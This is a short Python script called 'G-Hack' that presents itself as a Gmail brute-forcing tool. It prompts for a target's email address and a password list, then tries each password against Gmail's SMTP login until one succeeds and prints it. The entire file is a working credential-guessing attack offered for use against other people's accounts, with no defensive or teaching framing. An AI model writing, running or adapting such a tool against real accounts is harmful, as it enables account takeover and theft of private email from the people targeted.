import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
print ""
print "G-Hack is a free and open source GMail bruteforcing tool."
print ""
print "It was built by Harshit  on Feb, 2016."
print ""
print ""

user = raw_input("Enter the target's email address: ")
print""
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)
		print "[+]Password Found: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!]Password Incorrect: %s" % password
